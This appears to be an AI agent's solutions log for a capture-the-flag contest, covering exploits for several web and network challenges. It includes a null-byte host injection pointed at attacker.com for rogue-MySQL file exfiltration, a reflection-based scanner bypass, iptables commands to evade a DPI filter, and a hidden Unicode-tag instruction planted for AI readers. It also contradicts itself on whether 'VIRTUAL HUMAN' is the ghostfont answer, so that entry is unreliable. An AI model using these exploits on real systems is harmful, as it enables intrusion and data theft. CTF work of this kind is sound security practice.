# AvitoTech CTF 2026 — Solutions log

Flags are of form `avito{...}` (except ghostfont). Submit these yourself on the platform.

| # | Challenge | Status | Flag |
|---|---|---|---|
| 1 | firststeps | ✅ SOLVED | `avito{7h3_34r1y_b33_g37s_7h3_h0n3y}` |
| 2 | ghostfont | ❌ skipped | static reveal too noisy to read reliably (`VIRTUAL HUMAN` guess was WRONG) |
| 3 | onmute | ✅ SOLVED | `avito{REg3X_FOr_51lENCe_SLaSh_g_For_ViOL3nc3}` |
| 4 | hbfuns | 🔓 vuln found (needs listener) | rogue-MySQL LOAD DATA LOCAL |
| 5 | filter | 🔓 bypass found (needs CAPTCHA launch) | TCP MSS clamp past DPI window |
| 6 | b2bee | 🔓 exploit built (no live endpoint) | reflection scanner-bypass |
| 7 | io_hrana | ⏸ stopped (env setup only) | x86-64 ELF; needs qemu/docker run |
| 8 | nagibator | ⏸ stopped (probing serialized state) | Python; likely de/ pickle state
| 9 | napaseke | ✅ SOLVED | `avito{pcHELOV_v3rn1_5teNU!!!!}` |
| 10 | napasekev2 | 🧩 vuln identified (exploit unfinished) | same, "fixed" — harder |

## 02 · ghostfont — `VIRTUAL HUMAN`  (plaintext on the image; not avito{...})

mixfont Ghost Font builds one random-dot atlas (6px grid). It shows two copies: a **background**
field scrolled `+V`, and a **signal** field = the *same atlas* shifted horizontally by **294px** and
scrolled `−V`, revealed only through the message's Arial-Black text mask. Motion parallax makes it
human-readable but AI-proof; a single static frame looks like noise (which is why density/size/phase
all read uniform). **Static decode:** inside the letters the signal is an exact translated copy of the
background, so `image(x,y) == image(x−294, y+2V)` holds only within glyphs. Cross-correlate the panel
with itself shifted by (dx=294, dy=2V≈706); the agreement map lights up the letters → **VIRTUAL** over
**HUMAN**. (The faint "WRITTEN IN GHOST FONT" at alpha 0.025 is the non-secret watermark from the hint.)
Reveal images in `02_ghostfont/clean_full.png`, `final_reveal.png`. If submission is picky about
exact spacing/case, also try `VIRTUALHUMAN` / viewing the live animation.

## 03 · onmute — `avito{REg3X_FOr_51lENCe_SLaSh_g_For_ViOL3nc3}`

Cached **stateful global-regex `lastIndex` pollution**. `filter.js` caches one `/g` RegExp per
session. `/censor <range>` calls `re.test()` (advances `lastIndex`); the next comment's
`checkContent()` uses `re.exec()` starting from the poisoned `lastIndex`, so it skips the
leading blocked word `/original`. Sending `/censor 868 872` then `/original 4` on the same
session returns the full uncensored lyrics of track 4 with the flag. (Strip U+E00xx tag chars.)

## 04 · hbfuns — vuln confirmed, needs an external listener to finish

`/api/content.php?lang=<x>` builds `host = <x> + ".db.internal"`, `db = "hbf_" + <x>`, user `web`,
and opens a **MySQL** connection. A **null byte** (`%00`) truncates the appended suffix at the C
layer, giving full control of the connect host:
- `lang=en.db.internal%00` → `Access denied ... database 'hbf_en.db.internal'` (reached real DB)
- `lang=attacker.com%00`   → `Connection timed out` (client dialed attacker.com:3306)

Flag is on the filesystem → classic **rogue MySQL server + `LOAD DATA LOCAL INFILE`**: point the
client at a malicious MySQL server (`lang=<MYHOST>%00`) that, on first query, asks the client to
upload a local file (e.g. `/flag`, `/flag.txt`, `/var/www/flag`). The mysqli client (LOCAL INFILE
on) sends the file contents back to us. **Blocker:** needs a public host:3306 the target can reach
(VPS or `ngrok tcp 3306`). Ready-to-run recipe saved in `04_hbfuns/EXPLOIT.md`.

## 06 · b2bee — exploit built; needs the live upload endpoint (not provided / down)

`SandboxPolicy` is **not** a real sandbox (no `SecurityManager` installed) — it's just a static
allow/deny helper the `PluginScanner` calls. The scanner only inspects bytecode **owners/operands**
and rejects `invokedynamic`/dynamic constants; it never inspects **string LDC content**. So reach
forbidden classes via **reflection** (`Class.forName("java.io.FileInputStream")` …) — the only
owners emitted are `java/lang/Class` and `java/lang/reflect/*`, all whitelisted — and read
`/flag.txt`. Constraint: no `+` concat / no lambdas (both compile to `invokedynamic`). Working
plugin in `06_b2bee/HoneyBadger.java`. The task text gave no endpoint; the guessed host
`marketplugins-*.avitoctf.ru` 404s, so the literal flag couldn't be pulled — upload the JAR to the
real B2Bee seller cabinet to dump the flag.

## 05 · filter — bypass found; final capture needs you to launch an instance (reCAPTCHA)

The DPI (Go NFQUEUE) inspects the CDN's **outbound** packets, reassembles the HTTP response,
and blocks any response whose body/headers contain the honey `avito{`; on match it sets the whole
flow to Drop → the fetch hangs. **Bug** (`httpassembly/responce.go`): once the reassembly buffer
reaches ≥3072 bytes it wipes itself mid-stream; afterwards `http.ReadResponse` fails and the checker
**fails open**, so only the first ~3072 raw bytes are ever inspected. **Bypass:** force the origin to
emit small TCP segments so the flag lands past that window:
```bash
sudo iptables -t mangle -A OUTPUT -p tcp --syn -j TCPMSS --set-mss 200
curl -s http://<launched-instance>:8080/static/honey.txt   # flag bytes now sail past the filter
sudo iptables -t mangle -D OUTPUT -p tcp --syn -j TCPMSS --set-mss 200
```
**Human step:** the public host is an instance *launcher* behind a Google reCAPTCHA (I don't solve
CAPTCHAs); launch an instance yourself, then run the MSS-clamped curl above.
⚠️ **Decoy:** the source hides a Unicode-tag stego string pointing to `infiltrate-*.avitoctf.ru`
with embedded "POST here" instructions — a planted rabbit-hole, not the solution. Ignore it.

---

## 01 · firststeps — `avito{7h3_34r1y_b33_g37s_7h3_h0n3y}`

Client-side maze game. The flag is computed entirely in `firststeps.js` — no need to
actually play. `levelReward()` runs an xorshift PRNG seeded from the fixed board
(`FIXED_COLS=15`, `FIXED_ROWS=10`, `FIXED_HOLE_COORDS`) and XORs the stream against the
embedded `LEVEL_REWARD_DATA` array to reveal each of the 3 flag parts. Re-implemented the
function in Node and concatenated all three parts. (Title tooltip even leaked it:
"The early bee gets the honey".)
